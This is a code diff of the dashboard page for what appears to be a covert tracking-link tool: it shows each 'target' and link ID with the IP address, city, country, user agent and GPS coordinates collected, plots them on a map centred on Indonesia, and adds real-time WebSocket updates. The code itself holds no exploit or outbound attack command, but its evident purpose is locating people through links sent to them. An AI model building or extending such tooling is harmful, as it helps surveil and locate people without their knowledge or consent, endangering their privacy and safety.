@@ -3,40 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>:: VIEW TRACKING LOGS ::</title>
+    <title>:: REAL-TIME TRACKING LOGS v3.9 ::</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <style> #map { height: 400px; width: 100%; margin-top: 20px; border: 1px solid #0f0; } </style>
+    <style> 
+        #map { height: 400px; width: 100%; margin-top: 20px; border: 1px solid #0f0; } 
+    </style>
 </head>
 <body>
     <div class="container full-width">
-        <h1 class="main-title">> TRACKING_LOGS.DAT</h1>
+        <h1 class="main-title">> TRACKING_LOGS.DAT (REAL-TIME)</h1>
         <div class="nav-links">
-            <a href="/index.html">[ &lt;&lt; BACK ]</a>
-            <a href="#" id="refresh-btn">[ REFRESH DATA ]</a>
+            <a href="/dashboard.html">[ << BACK TO DASHBOARD ]</a>
+            <a href="#" id="refresh-btn">[ MANUAL REFRESH ]</a>
         </div>
         
         <div id="map"></div>
-
-        <div id="log-section"><p class="highlight">> Initializing log stream...</p></div>
+        <div id="log-section"><p class="highlight">> Initializing real-time log stream...</p></div>
     </div>
 
+    <script src="/socket.io/socket.io.js"></script>
     <script>
         const logSection = document.getElementById('log-section');
         let map;
         let markersLayer = L.layerGroup();
 
         function initMap() {
-            map = L.map('map').setView([-2.5489, 118.0149], 5); // Center on Indonesia
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
-            }).addTo(map);
-            markersLayer.addTo(map);
+            if (!map) {
+                map = L.map('map').setView([-2.5489, 118.0149], 5); // Center on Indonesia
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+                }).addTo(map);
+                markersLayer.addTo(map);
+            }
         }
 
         async function fetchLogs() {
-            logSection.innerHTML = "<p class='highlight'>> Fetching data from server...</p>";
+            logSection.innerHTML = "<p class='highlight'>> Fetching latest data from server...</p>";
             markersLayer.clearLayers();
             try {
                 const res = await fetch('/api/locations');
@@ -49,8 +53,14 @@
 
                 let html = `<table class="hacker-table">
                     <thead><tr>
-                        <th>Timestamp</th><th>Target ID</th><th>Link ID</th><th>IP Address</th>
-                        <th>User Agent</th><th>Coords</th>
+                        <th>Timestamp</th>
+                        <th>Target ID</th>
+                        <th>Link ID</th>
+                        <th>IP Address</th>
+                        <th>City</th>
+                        <th>Country</th>
+                        <th>User Agent</th>
+                        <th>Coords</th>
                     </tr></thead><tbody>`;
                 
                 rows.forEach(r => {
@@ -60,18 +70,19 @@
                         <td class="highlight">${r.username}</td>
                         <td>${r.tracker_id}</td>
                         <td>${r.ip_address}</td>
+                        <td class="highlight">${r.city || 'N/A'}</td>
+                        <td class="highlight">${r.country || 'N/A'}</td>
                         <td class="user-agent">${r.user_agent}</td>
                         <td><a href="${mapUrl}" target="_blank">View Map</a></td>
                     </tr>`;
                     
-                    // Add marker to map
+                    const locationString = (r.city && r.country) ? `${r.city}, ${r.country}` : 'Location unknown';
                     const marker = L.marker([r.latitude, r.longitude]).addTo(markersLayer);
-                    marker.bindPopup(`<b>${r.username}</b><br>${new Date(r.created_at).toLocaleString()}<br>IP: ${r.ip_address}`);
+                    marker.bindPopup(`<b>${r.username}</b><br>${new Date(r.created_at).toLocaleString()}<br>${locationString}<br>IP: ${r.ip_address}`);
                 });
                 html += "</tbody></table>";
                 logSection.innerHTML = html;
                 
-                // Adjust map view to fit all markers
                 if (rows.length > 0) {
                     map.fitBounds(markersLayer.getBounds());
                 }
@@ -81,7 +92,24 @@
             }
         }
 
-        document.getElementById('refresh-btn').addEventListener('click', fetchLogs);
+        // --- Logika Tombol & Real-time ---
+
+        // 1. Event listener untuk tombol refresh manual
+        document.getElementById('refresh-btn').addEventListener('click', (e) => {
+            e.preventDefault(); // Mencegah link pindah halaman
+            console.log('Manual refresh requested.');
+            fetchLogs();
+        });
+        
+        // 2. Event listener untuk update real-time dari server
+        const socket = io();
+        socket.on('connect', () => console.log('✅ Terhubung ke log stream via WebSocket!'));
+        socket.on('dashboard_update', () => {
+            console.log('🔄 Real-time update received from server. Fetching new logs...');
+            fetchLogs(); // Otomatis panggil fungsi fetchLogs saat ada update
+        });
+
+        // 3. Muat data pertama kali saat halaman dibuka
         document.addEventListener('DOMContentLoaded', () => {
             initMap();
             fetchLogs();
